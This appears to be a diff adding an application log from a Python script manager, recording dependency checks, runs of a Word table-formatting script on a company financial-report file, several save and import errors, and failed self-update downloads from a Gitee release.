+[2026-04-28 20:15:19] 扫描到的所有导入：docx, os, re, shlex, threading, tkinter, tkinterdnd2
+[2026-04-28 20:15:19] 第三方依赖：docx, tkinterdnd2
+[2026-04-28 20:15:19] 
+[2026-04-28 20:15:19]   docx: 已安装
+[2026-04-28 20:15:19]   tkinterdnd2: 已安装
+[2026-04-28 20:15:19] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:15:19] 所有依赖已满足
+[2026-04-28 20:15:19] 
+[2026-04-28 20:15:19] 依赖检查完成：报告word表格处理.py 所有依赖已满足
+[2026-04-28 20:15:22] 📄 报告word表格处理.py
+[2026-04-28 20:15:22] （该脚本无头注释）
+[2026-04-28 20:15:22] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:15:22] 扫描到的所有导入：docx, os, re, shlex, threading, tkinter, tkinterdnd2
+[2026-04-28 20:15:22] 第三方依赖：docx, tkinterdnd2
+[2026-04-28 20:15:22] 
+[2026-04-28 20:15:22]   docx: 已安装
+[2026-04-28 20:15:22]   tkinterdnd2: 已安装
+[2026-04-28 20:15:22] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:15:22] 所有依赖已满足
+[2026-04-28 20:15:22] 
+[2026-04-28 20:15:22] 开始运行：报告word表格处理.py
+[2026-04-28 20:15:22] 运行路径：报告word表格处理.py
+[2026-04-28 20:15:22] 
+[2026-04-28 20:16:59] 运行完成：报告word表格处理.py，退出码：0
+[2026-04-28 20:18:49] 📄 报告word表格处理.py
+[2026-04-28 20:18:49] （该脚本无头注释）
+[2026-04-28 20:18:49] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:18:49] 扫描到的所有导入：docx, os, re, shlex, threading, tkinter, tkinterdnd2, traceback
+[2026-04-28 20:18:49] 第三方依赖：docx, tkinterdnd2
+[2026-04-28 20:18:49] 
+[2026-04-28 20:18:49]   docx: 已安装
+[2026-04-28 20:18:49]   tkinterdnd2: 已安装
+[2026-04-28 20:18:49] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:18:49] 所有依赖已满足
+[2026-04-28 20:18:49] 
+[2026-04-28 20:18:49] 开始运行：报告word表格处理.py
+[2026-04-28 20:18:49] 运行路径：报告word表格处理.py
+[2026-04-28 20:18:49] 
+[2026-04-28 20:22:53] 运行完成：报告word表格处理.py，退出码：0
+[2026-04-28 20:22:59] ─── 框架依赖检查 ───
+[2026-04-28 20:22:59] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 20:22:59] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 20:23:05] 📄 报告word表格处理.py
+[2026-04-28 20:23:05] ────────────────────────────────────────
+[2026-04-28 20:23:05] Word表格一键优化工具 - 批量优化Word文档中的表格样式。
+
+功能：
+- 批量处理Word文档中的表格
+- 自动应用专业表格样式（边框、字体、对齐等）
+
+使用方式：
+from data.报告word表格处理 import process_word_tables
+process_word_tables(file_list, output_dir)
+
+依赖：python-docx
+[2026-04-28 20:23:06] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:23:06] 扫描到的所有导入：docx, modules, os, re, sys, traceback
+[2026-04-28 20:23:06] 第三方依赖：docx, modules
+[2026-04-28 20:23:06] 
+[2026-04-28 20:23:06]   docx: 已安装
+[2026-04-28 20:23:06]   modules: 已安装
+[2026-04-28 20:23:06] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:23:06] 所有依赖已满足
+[2026-04-28 20:23:06] 
+[2026-04-28 20:23:06] 依赖检查完成：报告word表格处理.py 所有依赖已满足
+[2026-04-28 20:23:08] 📄 报告word表格处理.py
+[2026-04-28 20:23:08] ────────────────────────────────────────
+[2026-04-28 20:23:08] Word表格一键优化工具 - 批量优化Word文档中的表格样式。
+
+功能：
+- 批量处理Word文档中的表格
+- 自动应用专业表格样式（边框、字体、对齐等）
+
+使用方式：
+from data.报告word表格处理 import process_word_tables
+process_word_tables(file_list, output_dir)
+
+依赖：python-docx
+[2026-04-28 20:23:08] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:23:08] 扫描到的所有导入：docx, modules, os, re, sys, traceback
+[2026-04-28 20:23:08] 第三方依赖：docx, modules
+[2026-04-28 20:23:08] 
+[2026-04-28 20:23:08]   docx: 已安装
+[2026-04-28 20:23:08]   modules: 已安装
+[2026-04-28 20:23:08] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:23:08] 所有依赖已满足
+[2026-04-28 20:23:08] 
+[2026-04-28 20:23:08] 开始运行：报告word表格处理.py
+[2026-04-28 20:23:08] 运行路径：报告word表格处理.py
+[2026-04-28 20:23:08] 
+[2026-04-28 20:23:08] Traceback (most recent call last):
+[2026-04-28 20:23:08]   File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\报告word表格处理.py", line 23, in <module>
+[2026-04-28 20:23:08]     from modules.logger import log_output
+[2026-04-28 20:23:08] ModuleNotFoundError: No module named 'modules'
+[2026-04-28 20:23:08] 运行完成：报告word表格处理.py，退出码：1
+[2026-04-28 20:23:47] 📄 报告word表格处理.py
+[2026-04-28 20:23:47] （该脚本无头注释）
+[2026-04-28 20:23:47] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:23:47] 扫描到的所有导入：docx, modules, os, re, sys, traceback
+[2026-04-28 20:23:47] 第三方依赖：docx, modules
+[2026-04-28 20:23:47] 
+[2026-04-28 20:23:47]   docx: 已安装
+[2026-04-28 20:23:47]   modules: 已安装
+[2026-04-28 20:23:47] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:23:47] 所有依赖已满足
+[2026-04-28 20:23:47] 
+[2026-04-28 20:23:47] 开始运行：报告word表格处理.py
+[2026-04-28 20:23:47] 运行路径：报告word表格处理.py
+[2026-04-28 20:23:47] 
+[2026-04-28 20:23:48] 用法: python 报告word表格处理.py <文件路径列表> <输出目录>
+[2026-04-28 20:23:48] 示例: python 报告word表格处理.py file1.docx,file2.docx output/
+[2026-04-28 20:23:48] 运行完成：报告word表格处理.py，退出码：1
+[2026-04-28 20:23:51] 📄 报告word表格处理.py
+[2026-04-28 20:23:51] （该脚本无头注释）
+[2026-04-28 20:23:51] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:23:51] 扫描到的所有导入：docx, modules, os, re, sys, traceback
+[2026-04-28 20:23:51] 第三方依赖：docx, modules
+[2026-04-28 20:23:51] 
+[2026-04-28 20:23:51]   docx: 已安装
+[2026-04-28 20:23:51]   modules: 已安装
+[2026-04-28 20:23:51] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:23:51] 所有依赖已满足
+[2026-04-28 20:23:51] 
+[2026-04-28 20:23:51] 开始运行：报告word表格处理.py
+[2026-04-28 20:23:51] 运行路径：报告word表格处理.py
+[2026-04-28 20:23:51] 
+[2026-04-28 20:23:52] 用法: python 报告word表格处理.py <文件路径列表> <输出目录>
+[2026-04-28 20:23:52] 示例: python 报告word表格处理.py file1.docx,file2.docx output/
+[2026-04-28 20:23:52] 运行完成：报告word表格处理.py，退出码：1
+[2026-04-28 20:23:53] 📄 报告word表格处理.py
+[2026-04-28 20:23:53] （该脚本无头注释）
+[2026-04-28 20:23:53] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:23:53] 扫描到的所有导入：docx, modules, os, re, sys, traceback
+[2026-04-28 20:23:53] 第三方依赖：docx, modules
+[2026-04-28 20:23:53] 
+[2026-04-28 20:23:53]   docx: 已安装
+[2026-04-28 20:23:53]   modules: 已安装
+[2026-04-28 20:23:53] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:23:53] 所有依赖已满足
+[2026-04-28 20:23:53] 
+[2026-04-28 20:23:53] 开始运行：报告word表格处理.py
+[2026-04-28 20:23:53] 运行路径：报告word表格处理.py
+[2026-04-28 20:23:53] 
+[2026-04-28 20:23:53] 用法: python 报告word表格处理.py <文件路径列表> <输出目录>
+[2026-04-28 20:23:53] 示例: python 报告word表格处理.py file1.docx,file2.docx output/
+[2026-04-28 20:23:53] 运行完成：报告word表格处理.py，退出码：1
+[2026-04-28 20:25:56] ─── 框架依赖检查 ───
+[2026-04-28 20:25:56] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 20:25:56] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 20:26:00] 📄 报告word表格处理.py
+[2026-04-28 20:26:00] （该脚本无头注释）
+[2026-04-28 20:26:00] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:26:00] 扫描到的所有导入：docx, modules, os, re, sys, traceback
+[2026-04-28 20:26:00] 第三方依赖：docx, modules
+[2026-04-28 20:26:00] 
+[2026-04-28 20:26:00]   docx: 已安装
+[2026-04-28 20:26:00]   modules: 已安装
+[2026-04-28 20:26:00] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:26:00] 所有依赖已满足
+[2026-04-28 20:26:00] 
+[2026-04-28 20:26:00] 开始运行：报告word表格处理.py
+[2026-04-28 20:26:00] 运行路径：报告word表格处理.py
+[2026-04-28 20:26:00] 
+[2026-04-28 20:26:00] 运行完成：报告word表格处理.py，退出码：0
+[2026-04-28 20:26:02] 📄 报告word表格处理.py
+[2026-04-28 20:26:02] （该脚本无头注释）
+[2026-04-28 20:26:02] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:26:02] 扫描到的所有导入：docx, modules, os, re, sys, traceback
+[2026-04-28 20:26:02] 第三方依赖：docx, modules
+[2026-04-28 20:26:02] 
+[2026-04-28 20:26:02]   docx: 已安装
+[2026-04-28 20:26:02]   modules: 已安装
+[2026-04-28 20:26:02] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:26:02] 所有依赖已满足
+[2026-04-28 20:26:02] 
+[2026-04-28 20:26:02] 开始运行：报告word表格处理.py
+[2026-04-28 20:26:02] 运行路径：报告word表格处理.py
+[2026-04-28 20:26:02] 
+[2026-04-28 20:26:03] 运行完成：报告word表格处理.py，退出码：0
+[2026-04-28 20:26:49] 📄 报告word表格处理.py
+[2026-04-28 20:26:49] （该脚本无头注释）
+[2026-04-28 20:26:49] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:26:49] 扫描到的所有导入：docx, modules, os, re, sys, threading, tkinter, traceback
+[2026-04-28 20:26:49] 第三方依赖：docx, modules
+[2026-04-28 20:26:49] 
+[2026-04-28 20:26:49]   docx: 已安装
+[2026-04-28 20:26:49]   modules: 已安装
+[2026-04-28 20:26:49] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:26:49] 所有依赖已满足
+[2026-04-28 20:26:49] 
+[2026-04-28 20:26:49] 开始运行：报告word表格处理.py
+[2026-04-28 20:26:49] 运行路径：报告word表格处理.py
+[2026-04-28 20:26:49] 
+[2026-04-28 20:26:56] 开始批量处理：共 1 个文件
+[2026-04-28 20:26:56] 输出目录：C:/Users/ahdsz/Desktop
+[2026-04-28 20:26:56] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 20:26:57] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 20:26:57] 处理完成：成功 1 / 总计 1
+[2026-04-28 20:26:57] 运行完成：报告word表格处理.py，退出码：0
+[2026-04-28 20:57:10] ─── 框架依赖检查 ───
+[2026-04-28 20:57:10] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 20:57:10] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 20:57:13] 📄 报告word表格处理.py
+[2026-04-28 20:57:13] （该脚本无头注释）
+[2026-04-28 20:57:13] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:57:13] 扫描到的所有导入：docx, modules, os, re, sys, threading, tkinter, traceback
+[2026-04-28 20:57:13] 第三方依赖：docx, modules
+[2026-04-28 20:57:13] 
+[2026-04-28 20:57:13]   docx: 已安装
+[2026-04-28 20:57:13]   modules: 已安装
+[2026-04-28 20:57:13] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:57:13] 所有依赖已满足
+[2026-04-28 20:57:13] 
+[2026-04-28 20:57:13] 开始运行：报告word表格处理.py
+[2026-04-28 20:57:13] 运行路径：报告word表格处理.py
+[2026-04-28 20:57:13] 
+[2026-04-28 20:57:21] 开始批量处理：共 1 个文件
+[2026-04-28 20:57:21] 输出目录：C:/Users/ahdsz/Desktop
+[2026-04-28 20:57:21] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 20:57:22] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 20:57:22] 处理完成：成功 1 / 总计 1
+[2026-04-28 20:57:23] 运行完成：报告word表格处理.py，退出码：0
+[2026-04-28 20:57:44] 📄 报告word表格处理.py
+[2026-04-28 20:57:44] （该脚本无头注释）
+[2026-04-28 20:57:44] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 20:57:44] 扫描到的所有导入：docx, modules, os, re, sys, threading, tkinter, traceback
+[2026-04-28 20:57:44] 第三方依赖：docx, modules
+[2026-04-28 20:57:44] 
+[2026-04-28 20:57:44]   docx: 已安装
+[2026-04-28 20:57:44]   modules: 已安装
+[2026-04-28 20:57:44] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 20:57:44] 所有依赖已满足
+[2026-04-28 20:57:44] 
+[2026-04-28 20:57:44] 开始运行：报告word表格处理.py
+[2026-04-28 20:57:44] 运行路径：报告word表格处理.py
+[2026-04-28 20:57:44] 
+[2026-04-28 20:57:49] 开始批量处理：共 1 个文件
+[2026-04-28 20:57:49] 输出目录：C:/Users/ahdsz/Desktop
+[2026-04-28 20:57:49] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 20:57:51] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 20:57:51] 处理完成：成功 1 / 总计 1
+[2026-04-28 20:57:51] 运行完成：报告word表格处理.py，退出码：0
+[2026-04-28 21:24:19] ─── 框架依赖检查 ───
+[2026-04-28 21:24:19] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 21:24:19] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 21:24:21] [Gitee] 最新版本: 1.8.8, 下载链接: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 21:24:21] 当前已是最新版本 v1.8.8
+[2026-04-28 21:25:40] ─── 框架依赖检查 ───
+[2026-04-28 21:25:40] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 21:25:40] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 21:25:43] [Gitee] 最新版本: 1.8.8, 下载链接: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 21:25:43] 当前已是最新版本 v1.8.8
+[2026-04-28 21:25:46] 开始下载更新到：C:\Users\ahdsz\AppData\Local\Temp\tmp9lnoqz1h\1.8.8.zip
+[2026-04-28 21:25:46] 开始下载文件，URL: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 21:25:46] 目标路径: C:\Users\ahdsz\AppData\Local\Temp\tmp9lnoqz1h\1.8.8.zip
+[2026-04-28 21:25:47] 下载中... (8192 bytes)
+[2026-04-28 21:25:47] 下载中... (16384 bytes)
+[2026-04-28 21:25:47] 下载中... (24576 bytes)
+[2026-04-28 21:25:47] 下载中... (32768 bytes)
+[2026-04-28 21:25:47] 下载中... (40960 bytes)
+[2026-04-28 21:25:47] 下载中... (47933 bytes)
+[2026-04-28 21:25:47] 下载完成: C:\Users\ahdsz\AppData\Local\Temp\tmp9lnoqz1h\1.8.8.zip
+[2026-04-28 21:25:47] 下载完成，开始应用更新
+[2026-04-28 21:25:47] 开始应用更新，当前文件：c:\Users\ahdsz\Documents\GitHub\pymanager\main.pyw
+[2026-04-28 21:25:47] 项目目录：c:\Users\ahdsz\Documents\GitHub\pymanager
+[2026-04-28 21:25:47] 下载路径：C:\Users\ahdsz\AppData\Local\Temp\tmp9lnoqz1h\1.8.8.zip
+[2026-04-28 21:25:47] 创建备份：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_01.zip
+[2026-04-28 21:25:48] 备份创建成功：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_01.zip
+[2026-04-28 21:25:48] 备份已创建：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_01.zip
+[2026-04-28 21:25:48] 解压到临时目录：C:\Users\ahdsz\AppData\Local\Temp\tmpews9dxka
+[2026-04-28 21:25:48] [错误] 应用更新过程中发生错误：File is not a zip file
+[2026-04-28 21:32:45] 开始批量处理：共 1 个文件
+[2026-04-28 21:32:45] 输出目录：C:/Users/ahdsz/Desktop
+[2026-04-28 21:32:45] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:32:47] ✗ 失败: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:32:47] 错误: [Errno 13] Permission denied: 'C:/Users/ahdsz/Desktop\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+[2026-04-28 21:32:47] 详细: Traceback (most recent call last):
+  File "c:\Users\ahdsz\Documents\GitHub\pymanager\data\报告word表格处理.py", line 223, in process_word_tables
+    doc.save(dst_path)
+    ~~~~~~~~^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\document.py", line 204, in save
+    self._part.save(path_or_stream)
+    ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\parts\document.py", line 114, in save
+    self.package.save(path_or_stream)
+    ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\package.py", line 166, in save
+    PackageWriter.write(pkg_file, self.rels, self.parts)
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\pkgwriter.py", line 34, in write
+    phys_writer = PhysPkgWriter(pkg_file)
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\phys_pkg.py", line 109, in __init__
+    self._zipf = ZipFile(pkg_file, "w", compression=ZIP_DEFLATED)
+                 ~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\zipfile\__init__.py", line 1453, in __init__
+    self.fp = io.open(file, filemode)
+              ~~~~~~~^^^^^^^^^^^^^^^^
+PermissionError: [Errno 13] Permission denied: 'C:/Users/ahdsz/Desktop\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+
+[2026-04-28 21:32:47] 处理完成：成功 0 / 总计 1
+[2026-04-28 21:33:03] 开始批量处理：共 1 个文件
+[2026-04-28 21:33:03] 输出目录：C:/Users/ahdsz/Desktop
+[2026-04-28 21:33:03] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:33:05] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 21:33:05] 处理完成：成功 1 / 总计 1
+[2026-04-28 21:35:45] ─── 框架依赖检查 ───
+[2026-04-28 21:35:45] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 21:35:45] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 21:35:48] [Gitee] 最新版本: 1.8.8, 下载链接: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 21:35:48] 当前已是最新版本 v1.8.8
+[2026-04-28 21:35:50] 开始下载更新到：C:\Users\ahdsz\AppData\Local\Temp\tmpupgltq8x\1.8.8.zip
+[2026-04-28 21:35:50] 开始下载文件，URL: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 21:35:50] 目标路径: C:\Users\ahdsz\AppData\Local\Temp\tmpupgltq8x\1.8.8.zip
+[2026-04-28 21:35:51] 下载中... (8192 bytes)
+[2026-04-28 21:35:51] 下载中... (16384 bytes)
+[2026-04-28 21:35:51] 下载中... (24576 bytes)
+[2026-04-28 21:35:51] 下载中... (32768 bytes)
+[2026-04-28 21:35:51] 下载中... (40960 bytes)
+[2026-04-28 21:35:51] 下载中... (47933 bytes)
+[2026-04-28 21:35:51] 下载完成: C:\Users\ahdsz\AppData\Local\Temp\tmpupgltq8x\1.8.8.zip
+[2026-04-28 21:35:51] 下载完成，开始应用更新
+[2026-04-28 21:35:51] 开始应用更新，当前文件：c:\Users\ahdsz\Documents\GitHub\pymanager\main.pyw
+[2026-04-28 21:35:51] 项目目录：c:\Users\ahdsz\Documents\GitHub\pymanager
+[2026-04-28 21:35:51] 下载路径：C:\Users\ahdsz\AppData\Local\Temp\tmpupgltq8x\1.8.8.zip
+[2026-04-28 21:35:51] 创建备份：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_02.zip
+[2026-04-28 21:35:51] 备份创建成功：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_02.zip
+[2026-04-28 21:35:51] 备份已创建：c:/Users/ahdsz/Documents/GitHub/pymanager\backups\备份20260428_02.zip
+[2026-04-28 21:35:51] 解压到临时目录：C:\Users\ahdsz\AppData\Local\Temp\tmph3u8nu8_
+[2026-04-28 21:35:51] [错误] 应用更新过程中发生错误：File is not a zip file
+[2026-04-28 21:36:30] ─── 框架依赖检查 ───
+[2026-04-28 21:36:30] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 21:36:30] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 21:36:32] 📄 报告word表格处理.py
+[2026-04-28 21:36:32] （该脚本无头注释）
+[2026-04-28 21:36:33] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 21:36:33] 扫描到的所有导入：docx, modules, os, re, sys, threading, tkinter, traceback
+[2026-04-28 21:36:33] 第三方依赖：docx, modules
+[2026-04-28 21:36:33] 
+[2026-04-28 21:36:33]   docx: 已安装
+[2026-04-28 21:36:33]   modules: 已安装
+[2026-04-28 21:36:33] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 21:36:33] 所有依赖已满足
+[2026-04-28 21:36:33] 
+[2026-04-28 21:36:33] 开始运行：报告word表格处理.py
+[2026-04-28 21:36:33] 运行路径：报告word表格处理.py
+[2026-04-28 21:36:33] 
+[2026-04-28 21:36:42] 开始批量处理：共 1 个文件
+[2026-04-28 21:36:42] 输出目录：C:/Users/ahdsz/Desktop
+[2026-04-28 21:36:42] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:36:44] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 21:36:44] 处理完成：成功 1 / 总计 1
+[2026-04-28 21:36:44] 运行完成：报告word表格处理.py，退出码：0
+[2026-04-28 21:39:50] 开始批量处理：共 1 个文件
+[2026-04-28 21:39:50] 输出目录：output
+[2026-04-28 21:39:50] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:39:52] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 21:39:52] 处理完成：成功 1 / 总计 1
+[2026-04-28 21:39:56] [Gitee] 最新版本: 1.8.8, 下载链接: https://gitee.com/yaopei6678/pymanager/archive/refs/tags/1.8.8.zip
+[2026-04-28 21:39:56] 当前已是最新版本 v1.8.8
+[2026-04-28 21:42:50] 开始批量处理：共 1 个文件
+[2026-04-28 21:42:50] 输出目录：output
+[2026-04-28 21:42:50] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:42:52] ✗ 失败: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:42:52] 错误: [Errno 13] Permission denied: 'output\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+[2026-04-28 21:42:52] 详细: Traceback (most recent call last):
+  File "C:\Users\ahdsz\Documents\GitHub\pymanager\data\报告word表格处理.py", line 249, in process_word_tables
+    doc.save(dst_path)
+    ~~~~~~~~^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\document.py", line 204, in save
+    self._part.save(path_or_stream)
+    ~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\parts\document.py", line 114, in save
+    self.package.save(path_or_stream)
+    ~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\package.py", line 166, in save
+    PackageWriter.write(pkg_file, self.rels, self.parts)
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\pkgwriter.py", line 34, in write
+    phys_writer = PhysPkgWriter(pkg_file)
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\site-packages\docx\opc\phys_pkg.py", line 109, in __init__
+    self._zipf = ZipFile(pkg_file, "w", compression=ZIP_DEFLATED)
+                 ~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\ahdsz\AppData\Local\Programs\Python\Python314\Lib\zipfile\__init__.py", line 1453, in __init__
+    self.fp = io.open(file, filemode)
+              ~~~~~~~^^^^^^^^^^^^^^^^
+PermissionError: [Errno 13] Permission denied: 'output\\4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx'
+
+[2026-04-28 21:42:52] 处理完成：成功 0 / 总计 1
+[2026-04-28 21:43:55] ─── 框架依赖检查 ───
+[2026-04-28 21:43:55] 扫描完成：添加 10 个脚本，更新 0 个脚本
+[2026-04-28 21:43:55] 框架依赖检查通过，所有依赖已就绪。
+[2026-04-28 21:43:58] 📄 报告word表格处理.py
+[2026-04-28 21:43:58] （该脚本无头注释）
+[2026-04-28 21:43:58] 📄 报告word表格处理.py
+[2026-04-28 21:43:58] （该脚本无头注释）
+[2026-04-28 21:43:59] ─── 脚本「报告word表格处理.py」依赖检查 ───
+[2026-04-28 21:43:59] 扫描到的所有导入：docx, modules, os, re, sys, threading, tkinter, traceback
+[2026-04-28 21:43:59] 第三方依赖：docx, modules
+[2026-04-28 21:43:59] 
+[2026-04-28 21:43:59]   docx: 已安装
+[2026-04-28 21:43:59]   modules: 已安装
+[2026-04-28 21:43:59] 
+直接依赖已满足，正在验证传递依赖...
+[2026-04-28 21:43:59] 所有依赖已满足
+[2026-04-28 21:43:59] 
+[2026-04-28 21:43:59] 开始运行：报告word表格处理.py
+[2026-04-28 21:43:59] 运行路径：报告word表格处理.py
+[2026-04-28 21:43:59] 
+[2026-04-28 21:44:07] 开始批量处理：共 1 个文件
+[2026-04-28 21:44:07] 输出目录：C:/Users/ahdsz/Desktop
+[2026-04-28 21:44:07] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:44:09] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 21:44:09] 处理完成：成功 1 / 总计 1
+[2026-04-28 21:44:09] 运行完成：报告word表格处理.py，退出码：0
+[2026-04-28 21:45:38] 开始批量处理：共 1 个文件
+[2026-04-28 21:45:38] 输出目录：output
+[2026-04-28 21:45:38] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:45:39] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 21:45:39] 处理完成：成功 1 / 总计 1
+[2026-04-28 21:48:28] 开始批量处理：共 1 个文件
+[2026-04-28 21:48:28] 输出目录：output
+[2026-04-28 21:48:28] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
+[2026-04-28 21:48:30] ✓ 成功: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx -> 4、财务报表附注（2025年度）-陕西安康高新集团-0417_优化后.docx
+[2026-04-28 21:48:30] 处理完成：成功 1 / 总计 1
+[2026-04-28 21:49:29] 开始批量处理：共 1 个文件
+[2026-04-28 21:49:29] 输出目录：output
+[2026-04-28 21:49:29] [1/1] 正在处理: 4、财务报表附注（2025年度）-陕西安康高新集团-0417.docx
